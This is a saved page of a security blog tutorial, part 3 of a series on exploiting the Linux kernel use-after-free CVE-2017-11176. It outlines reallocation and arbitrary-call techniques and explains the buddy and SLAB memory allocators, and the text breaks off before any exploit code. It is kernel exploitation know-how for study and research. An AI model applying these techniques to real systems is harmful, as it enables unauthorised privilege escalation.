<!DOCTYPE html>
<!-- saved from url=(0073)https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html -->
<html lang="en" class="fontawesome-i2svg-active fontawesome-i2svg-complete"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Lexfo's security blog - CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 3/4)</title><meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"><style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link href="https://blog.lexfo.fr/feeds/all.atom.xml" rel="alternate" title="Lexfo&#39;s security blog Full Atom Feed" type="application/atom+xml"><link href="https://blog.lexfo.fr/feeds/all.rss.xml" rel="alternate" title="Lexfo&#39;s security blog Full RSS Feed" type="application/rss+xml"><link href="https://blog.lexfo.fr/feeds/%7Bslug%7D.atom.xml" rel="alternate" title="Lexfo&#39;s security blog Categories Atom Feed" type="application/atom+xml"><link href="https://blog.lexfo.fr/feeds/%7Bslug%7D.rss.xml" rel="alternate" title="Lexfo&#39;s security blog Categories RSS Feed" type="application/rss+xml"><link href="https://blog.lexfo.fr/theme/images/favicon.ico" rel="icon" type="image/x-icon"><link href="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/packed.css" rel="stylesheet" type="text/css"></head><body><header class="blog-header py-3 text-center" id="logo"><h1><a href="https://blog.lexfo.fr/"><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/lexfo.png" title="Lexfo&#39;s security blog"></a></h1></header><nav class="navbar navbar-expand-md navbar-dark mb-4" style="background-color: rgb(179,32,39);"><div class="container"><button aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbarSupportedContent" data-toggle="collapse" type="button"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav position-absolute-left"><li class="nav-item"><a class="nav-link text-light" href="https://lexfo.fr/">Back to the main site</a></li></ul><ul class="navbar-nav ml-auto mr-auto"><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/">Home</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/categories.html">Categories</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/tags.html">Tags</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/archives.html">Archives</a></li></ul></div></div></nav><main class="container" role="main"><div class="row"><article class="col-10 offset-1 blog-main"><div class="p-3 blog-post rounded"><h1 class="blog-post-title mb-1">CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 3/4)</h1><div class="blog-post-meta mb-4"><p><span class="mr-3"><strong>Tue 02 October 2018</strong> by <strong>Nicolas FABRETTI</strong> in <strong><a href="https://blog.lexfo.fr/category/vulnerability.html">Vulnerability</a>.</strong></span></p><p><span><a "="" class="mr-2" href="https://blog.lexfo.fr/tag/linux.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Linux</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/exploit.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Exploit</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/vulnerability.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Vulnerability</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/kernel.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Kernel</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/step-by-step.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Step-by-step</a></span></p><div class="share" id="post-share-links"><div class="share-twitter"><a href="https://twitter.com/intent/tweet?text=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%203/4%29&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-twitter fa-w-16" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i aria-hidden="true" class="fab fa-twitter"></i> -->Tweet</span></a></div><div class="share-facebook"><a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-facebook fa-w-14" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i aria-hidden="true" class="fab fa-facebook"></i> -->Share</span></a></div><div class="share-linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html&amp;title=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%203/4%29&amp;summary=The%20third%20article%20covers%20use-after-free%20exploitation.%20Starting%20from%20the%20PoC%2C%20it%20will%20explain%20what%20is%20needed%20to%20exploit%20UAF%20in%20ring-0%2C%20how%20to%20do%20a%20reallocation%20and%20gain%20an%20arbitrary%20call%20primitive.%20The%20core%20concept%20section%20focuses%20on%20the%20memory%20management%20subsystem%20%28SLAB%20allocator%29.&amp;source=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-linkedin fa-w-14" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i aria-hidden="true" class="fab fa-linkedin"></i> -->Share</span></a></div><div class="share-email"><a href="mailto:?subject=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%203/4%29&amp;body=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-envelope fa-w-16" data-prefix="far" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg><!-- <i aria-hidden="true" class="far fa-envelope"></i> -->Share</span></a></div></div></div><div class="blog-post-content"><h1 id="introduction">Introduction</h1><p>In the <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">previous article</a>, we implemented a <em>proof-of-concept</em> that triggers the bug from userland, dropping kernel modifications made with System Tap in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">part 1</a>.</p><p>This article starts by introducing the memory subsystem and the SLAB allocator. Those are such huge topics that <strong>we strongly recommend the reader to get the external resources pointed out</strong>. Understanding them is absolutely mandatory to exploit any kind of use-after-free or heap overflow bugs.</p><p>The basic theory about use-after-free will be explained, as well as the information gathering steps required to exploit them. Next, we will try to apply it to the bug and analyze different primitives available in our particular bug. A reallocation strategy will be presented to turn the use-after-free into an arbitrary call primitive. In the end, the exploit will be able to panic the kernel in a controlled manner (no random crash anymore).</p><p>The technics exposed here are a common way to exploit a use-after-free in the Linux Kernel (type confusion). Moreover, the way chosen to exploit the use-after-free is the arbitrary call. Because of hardcoded stuff, the exploit cannot be <em>targetless</em>, nor bypass kASLR (the kernel version of Address Space Layout Randomization).</p><p>Note that this very same bug might be exploited in various ways to gain other primitives (i.e. arbitrary read/write) and bypass kaslr/smap/smep (we will bypass smep in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">part 4</a> however). With the <em>proof-of-concept</em> code in hands, this is where you can actually be creative as an exploit writer.</p><p>In addition, kernel exploits run in a very chaotic environment. While it was not a problem in previous articles, now it will (cf. reallocation). That is, if there is one place where your exploit can fail (because you've been raced), it will mostly be here. Reliable reallocation being an <em>open field</em> subject, more <em>complex</em> tricks cannot fit in this article.</p><p>Finally, because kernel data structure layout will matter now, and those being different in the debug/production kernel, we will say goodbye to system tap as it can't run on a production kernel. It means that we will need to use more classic tools in order to debug the exploit. Furthermore, your structure layouts will mostly be different from ours, <strong>the exploit provided here won't work on your system without modifications</strong>.</p><p>Get ready to crash (a lot), this is where the fun begins :-).</p><hr><h1 id="table-of-contents">Table of Contents</h1><ul><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#core-concepts-3">Core Concepts #3</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#use-after-free-101">Use-after-free 101</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#analyze-the-uaf-cache-allocation-free">Analyze the UAF (cache, allocation, free)</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#analyze-the-uaf-dangling-pointers">Analyze the UAF (dangling pointers)</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#exploit-reallocation">Exploit (Reallocation)</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#exploit-arbitrary-call">Exploit (Arbitrary Call)</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html#conclusion">Conclusion</a></li></ul><hr><h1 id="core-concepts-3">Core Concepts #3</h1><p>The third "core concepts" section tries to introduce the memory subsystem (also called "mm"). This is such a <em>vast</em> subject that books exist to only cover this part of the kernel. Because this section isn't self-sufficient, it is recommended to read the following documentations. Nevertheless, it will present core data structure of the Linux kernel used to manage memory so we can be on the same page (pun intended).</p><ul><li>Understanding the Linux Kernel (chapters 2,8,9)</li><li><a href="https://www.kernel.org/doc/gorman/pdf/understand.pdf">Understanding The Linux Virtual Memory Manager</a></li><li><a href="https://static.lwn.net/images/pdf/LDD3/ch08.pdf">Linux Device Driver: Allocating Memory</a></li><li><a href="https://wiki.osdev.org/Paging">OSDev: Paging</a></li></ul><p><strong>At the very least, please the read the <a href="https://www.kernel.org/doc/gorman/html/understand/understand011.html">chapter 8</a> of "Understanding The Linux Virtual Memory Manager"</strong>.</p><p>In the end of this <em>core concept</em> section, we will introduce the <strong>container_of()</strong> macro and present a common usage of <em>doubly-linked circular list</em> in the Linux kernel. A basic example will be developed to understand the <strong>list_for_each_entry_safe()</strong> macro (mandatory for the exploit).</p><h2 id="physical-page-management">Physical Page Management</h2><p>One of the most critical tasks of any operating system is to manage memory. It has to be fast, secure, stable and minimize <em>fragmentation</em>. Unfortunately, most of these goals are orthogonal (security often implies performance penalty). For efficiency reasons, the physical memory is divided in a <em>fixed-length</em> block of contiguous memory. This block is called a <strong>page frame</strong> and (generally) has a fixed size of 4096 bytes. It can be retrieved using the <em>PAGE_SIZE</em> macro.</p><p>Because the kernel must handle memory, it has kept track of every physical page frames as well as information about them. For instance, it has to know if a particular page frame is free for use or not. This kind of information is stored in a <strong>struct page</strong> data structure (also called "Page Descriptor").</p><p>The kernel can request one or more contiguous pages with <em>alloc_pages()</em> and free them with <em>free_pages()</em>. The allocator responsible to handle those requests is called the <em>Zoned Page Frame Allocator</em>. Since this allocator uses a <a href="https://en.wikipedia.org/wiki/Buddy_memory_allocation">buddy system algorithm</a>, it is often just called the <strong>Buddy Allocator</strong>.</p><h2 id="slab-allocators">Slab Allocators</h2><p>The granularity offered by the buddy allocator is not suitable for every situation. For instance, if the kernel only wants to allocate 128 bytes of memory, it might ask for a page but then, 3968 bytes of memory will get wasted. This is called <a href="https://en.wikipedia.org/wiki/Fragmentation_(computing)">internal fragmentation</a>. To overcome this issue, Linux implements more fine-grained allocators: <strong>Slab Allocators</strong>. To keep it simple, consider that the Slab Allocator is responsible for handling the equivalence of <em>malloc() / free()</em> for the kernel.</p><p>The Linux kernel offers three different Slab allocators (only one is used):</p><ul><li>SLAB allocator: the historical allocator, focused on hardware cache optimization (Debian still uses it).</li><li>SLUB allocator: the "new" standard allocator since 2007 (used by Ubuntu/CentOS/Android).</li><li>SLOB allocator: designed for embedded systems with very little memory.</li></ul><p><strong>NOTE</strong>: We will use the following naming convention: Slab is "a" Slab allocator (be it SLAB, SLUB, SLOB). The SLAB (capital) is one of the three allocators. While a slab (lowercase) is an object used by Slab allocators.</p><p>We cannot cover every Slab allocator here. Our target uses the SLAB allocator which is well documented. The SLUB seems to be more widespread nowadays and there isn't much documentation but the code itself. Fortunately, (we think that) the SLUB is actually easier to understand. There is no "cache coloring" stuff, it does not track "full slab", there is no internal/external slab management, etc. In order to know which Slab is deployed on your target, read the config file:</p><div class="highlight"><pre><span></span><code>$ grep <span class="s2">"CONFIG_SL.B="</span> /boot/config-<span class="k">$(</span>uname -r<span class="k">)</span>
</code></pre></div><p>The <em>reallocation</em> part will change depending on the deployed Slab allocator. While being more complex to understand, <strong>it is easier to exploit <em>use-after-free</em> on the SLAB</strong> than the SLUB. On the other hand, exploiting the SLUB brings another benefit: slab aliasing (i.e. more objects are stored in the "general" kmemcaches).</p><h2 id="cache-and-slab">Cache and slab</h2><p>Because the kernel tends to allocate object of the same size again and again, it would be inefficient to request/release pages of the same memory area. To prevent this, the Slab allocator stores object of the same size in a <em>cache</em> (a pool of allocated page frames). A cache is described by the <strong>struct kmem_cache</strong> (also called "cache descriptor"):</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">kmem_cache</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ...</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w">        </span><span class="n">num</span><span class="p">;</span><span class="w">              </span><span class="c1">// number of objects per slab</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w">        </span><span class="n">gfporder</span><span class="p">;</span><span class="w">         </span><span class="c1">// logarithm number of contiguous page frames in a slab</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w">          </span><span class="o">*</span><span class="n">name</span><span class="p">;</span><span class="w">            </span><span class="c1">// name of the cache </span>
<span class="w">    </span><span class="kt">int</span><span class="w">                 </span><span class="n">obj_size</span><span class="p">;</span><span class="w">         </span><span class="c1">// object size in this cache</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">kmem_list3</span><span class="w">   </span><span class="o">**</span><span class="n">nodelists</span><span class="p">;</span><span class="w">      </span><span class="c1">// holds list of empty/partial/full slabs</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">array_cache</span><span class="w">  </span><span class="o">*</span><span class="n">array</span><span class="p">[</span><span class="n">NR_CPUS</span><span class="p">];</span><span class="w">  </span><span class="c1">// per-cpu cache</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>The objects themselves are stored in slabs. <strong>A slab is basically one or more contiguous page frame(s)</strong>. A single slab can hold <em>num</em> objects of size <em>obj_size</em>. For instance, a slab spanned across a single page (4096 bytes) can holds 4 objects of 1024 bytes.</p><p>The status of a single slab (e.g. number of free objects) is described by the <strong>struct slab</strong> (also called "slab management structure"):</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">slab</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">list_head</span><span class="w"> </span><span class="n">list</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">colouroff</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">s_mem</span><span class="p">;</span><span class="w">                  </span><span class="c1">// virtual address of the first object</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">inuse</span><span class="p">;</span><span class="w">           </span><span class="c1">// number of "used" object in the slab</span>
<span class="w">    </span><span class="n">kmem_bufctl_t</span><span class="w"> </span><span class="n">free</span><span class="p">;</span><span class="w">           </span><span class="c1">// the use/free status of each objects</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">short</span><span class="w"> </span><span class="n">nodeid</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>The slab management structure can be either stored in the slab itself (internal) or in another memory location (external). The rationale behind this is to reduce <a href="https://en.wikipedia.org/wiki/Fragmentation_(computing)">external fragmentation</a>. Where the slab management structure is stored depends on the object size of the cache. If the object size is smaller than 512 bytes, the slab management structure is stored inside the slab otherwise it is stored externally.</p><p><strong>NOTE</strong>: Do not worry too much about this internal/external stuff, we are exploiting a <em>use-after-free</em>. On the other hand, if you are exploiting a <em>heap overflow</em>, understanding this would be mandatory.</p><p>Retrieving the <em>virtual address</em> of an object in a slab can be done with the <strong>s_mem</strong> field in combination with offsets. To keep it simple, consider that the first object address is <em>s_mem</em>, the second object is <em>s_mem + obj_size</em>, the third <em>s_mem + 2*obj_size</em>, etc... This is actually more complex because of "colouring" stuff used for hardware cache efficiency, but this is out-of-topic.</p><h2 id="slabs-housekeeping-and-buddy-interactions">Slabs Housekeeping and Buddy interactions</h2><p>When a new slab is created, the Slab allocator politely asks the Buddy allocator for page frames. Conversely, when a slab is destroyed, it gives its pages back to the Buddy. Of course, the kernel tries to reduce slab creation/destruction for performance reasons.</p><p><strong>NOTE</strong>: One might wonder why <em>gfporder</em> (<em>struct kmem_cache</em>) is the "logarithm number" of contiguous page frames. The reason is that the Buddy allocator does not work with byte sizes. Instead it works with power-of-two "order". That is, an order of 0 means 1 page, order of 1 means 2 <em>contiguous</em> pages, order of 2 means 4 <em>contiguous</em> pages, etc.</p><p>For each cache, the Slab allocator keeps three doubly-linked lists of slabs:</p><ul><li>full slabs: all objects of a slab are used (i.e. allocated)</li><li>free slabs: all objects of a slab are free (i.e. the slab is empty)</li><li>partial slabs: some objects of the slab are used and other are free</li></ul><p>These lists are stored in the cache descriptor (<em>struct kmem_cache</em>) in the <strong>nodelists</strong> field. Each slab belong to one of these lists. A slab can be moved between them during allocation or free operations (e.g. when allocating the last free object of a partial list, the slab is moved to the <em>full slabs list</em>).</p><p>In order to reduce the interactions with the Buddy allocator, the <strong>SLAB allocator keeps a <em>pool</em> of several free/partial slabs</strong>. When allocating an object, it tries to find a free object from those lists. If every slab is full, the Slab needs to create new slabs by asking more pages to the Buddy. This is known as a <em>cache_grow()</em> operation. Conversely, if the Slab has "too much" free slabs, it destroys some to give pages back to the Buddy.</p><h2 id="per-cpu-array-cache">Per-CPU Array Cache</h2><p>In the previous section, we've seen than during an allocation, the Slab needs to <em>scan</em> the free or the partial slabs list. Finding a free slot through list scanning 